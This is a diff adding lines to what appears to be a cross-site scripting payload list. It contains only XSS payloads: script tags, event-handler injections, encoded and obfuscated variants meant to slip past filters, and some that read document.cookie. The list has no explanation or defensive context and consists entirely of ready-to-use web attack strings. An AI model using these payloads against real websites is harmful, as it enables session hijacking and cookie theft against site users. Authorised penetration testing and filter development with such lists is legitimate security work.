@@ -340,3 +340,14 @@ javascript​:var a="ale";var b="rt";var c="()";decodeURI("<button popovertarget
 "><Body/oNpagEshoW​=(prompt)(1)>
 <<TexTArEa/*%00//%00*/a="not"/*%00///AutOFocUs////onFoCUS​=alert`1` //
 "><body/oNpagEshoW​=(confirm)(document.domain)>
+<%2FsCrIpT><​ScRiPt>alert(document.cookie)<%2FsCrIpT>
+<img%20src=x%20onmouseover=prompt%26%2300000000000000000040;document.cookie%26%2300000000000000000041;
+%2522%253e%253cscript%253ealert%2528%2527BUG XSS By Wildan!%2527%2529%253c%252fscript%253
+">><plaintext%2Fonmouseover%3Dprompt(1)+><​script>prompt(1)<%2Fscript>
+"><img/src=%20only=1%20OnErRor=x=alert`XSS`><!--
+sm"*alert(1)*"
+"*alert(1)*"
+%22-alert('XSS')-%22
+<svg/onload​=alert(1)>
+><%2fSCRIPT>">'><​SCRIPT>alert(String.fromCharCode(88,83,83)) <%2fSCRIPT> `
+`'%3balert(String.fromCharCode(88,83,83))%2f%2f'%3balert(String.fromCharCode(88,83,83))%2f%2f"%3balert(String.fromCharCode(88,83,83))%2f%2f"%3balert(String.fromCharCode(88,83,83))%2f%2f--
